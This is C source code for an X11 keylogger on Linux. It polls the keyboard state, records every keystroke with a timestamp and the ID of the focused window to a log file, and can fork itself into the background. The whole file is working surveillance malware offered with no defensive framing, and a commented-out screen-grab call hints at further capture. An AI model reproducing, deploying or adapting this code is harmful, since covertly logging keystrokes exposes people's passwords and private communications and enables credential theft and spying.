#include <X11/Xlib.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include "buffer.h"

#define SIZE 1024
#define SLEEP 50000
#define INTERVALOFINACTIVITY 5

time_t timeout = 0;

int background = 0;
int output = 0;
char *outputfile = "key.log";

void handleArgs(int argc, char* argv[]) {

    int i;

    for (i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-b") == 0) || (strcmp(argv[i], "--background") == 0)) {
            background = 1;
        }

        else if ((strcmp(argv[i], "-o") == 0) || (strcmp(argv[i], "--output") == 0)) {
            output = 1;
            if (i + 1 <= argc - 1)  {
                i++;
                outputfile = argv[i];
            }
            else {
                printf("Not good.");
            }
        }
    }
}

void log(const char * fmt, ...) {

    va_list va_alist;
    char buf[2048], logbuf[2048];
    FILE* file;
    struct tm* current_tm;
    time_t current_time;
    time(&current_time);

    current_tm = localtime (&current_time);
    sprintf(logbuf, "[%02d:%02d:%02d] ", current_tm->tm_hour, current_tm->tm_min, current_tm->tm_sec);

    va_start(va_alist, fmt);
    vsprintf(buf, fmt, va_alist);
    va_end(va_alist);

    strcat(logbuf, buf);
    strcat(logbuf, "\n");

    if ((file = fopen(outputfile, "a+")) != NULL) {
        fputs(logbuf, file);
        fclose(file);
    }
}

void addParentheses(char **res) {
    char *tmp = *res;
    *res = (char*)malloc(snprintf(NULL, 0, " (%s) ", tmp) + 1);
    sprintf(*res, " (%s) ", tmp);
}


void keylogger() {
    BUFFER *b;
    b = initBuffer();
    Display *display;

    char keyboardState[32];
    char keyboardStateOld[32] = {0};

    char bit, bitOld;
    int  iCheck;

    char keyboardStatesym, *keyboardStateString;

    int keyCode;
    int needToFree = 0;

    Window focusWin = NULL, oldfocusWin = NULL;
    int iReverToReturn = NULL;

    display = XOpenDisplay(NULL);

    if (display == NULL) {
        printf("Error: XOpenDisplay");
    }

    int logging = 0;

    while(1) { 

        usleep(SLEEP);

        if ((logging == 1) && (time(NULL) > timeout)) {
            logging = 0;
            log(" [%x] %s\n", focusWin, b->buffer);
            emptyData(b);
        }
            
        XQueryKeymap(display, keyboardState);
        
        if (memcmp(keyboardState, keyboardStateOld, 32) != NULL) {
            
            /*
            XImage* pic;
            pic = XGetImage(display, RootWindow(display, DefaultScreen(display)), 10, 10, 201, 201, AllPlanes, ZPixmap);   
            */

            int i = 0, j = 0;

            for(i = 0; i < sizeof( keyboardState ); i++) {
                bit = keyboardState[i];
                bitOld = keyboardStateOld[i];
                iCheck = 1;

                for ( j = 0 ; j < 8 ; j++ ) {
                    if ((bit & iCheck) && !(bitOld & iCheck)) {
                        keyCode = i * 8 + j;

                        keyboardStatesym = XkbKeycodeToKeysym(display, keyCode, 0, 0);
                        keyboardStateString = XKeysymToString(keyboardStatesym);

                        if (keyboardStateString == NULL) { 
                            switch (keyCode) {
                                case 22:
                                    keyboardStateString = "backspace";
                                    break;
                                case 36:
                                    keyboardStateString = "enter";
                                    break;
                                default:
                                    keyboardStateString = "unknown";
                            }
                        }

                        if (strlen(keyboardStateString) > 1) {
                            addParentheses(&keyboardStateString);
                            needToFree = 1;
                        }

                         // Get current active window
                        oldfocusWin = focusWin;
                        XGetInputFocus(display, &focusWin, &iReverToReturn);

                        if (!background) {
                            printf( "WindowID %x Key: %s Code: %i\n", focusWin, keyboardStateString, keyCode );
                        }

                        if (focusWin != oldfocusWin) {
                            log("[window changed] %s\n", b->buffer);
                            emptyData(b);
                        }


                        addData(b, keyboardStateString);
                        //printf("Contents of buffer: %s", b->buffer);

                        timeout = time(NULL) + INTERVALOFINACTIVITY;
                        logging = 1;

                        if (needToFree) {
                            free(keyboardStateString);
                            needToFree = 0;
                        }

                    }
                    iCheck = iCheck << 1 ;
                }
            }
        }
        memcpy(keyboardStateOld, keyboardState, 32);
    }
    XCloseDisplay(display);
}

void createProccess() {
    pid_t pid;
    pid = fork();

    // If main, fork.
    if (pid > 0) {
        printf("Main: Creating proccess (PID: %i)\n", pid);
        return;
    }

    // If error...
    if (pid == -1) {
        printf("Error while trying to fork!");
        return;
    }

    // If proccess, run keylogger.
    if (pid == 0) {
        keylogger();
    }
}

int main(int argc, char *argv[]) {  
    
    handleArgs(argc, argv);

    if (background) {
        createProccess();
    }
    else {
        keylogger();
    }
}
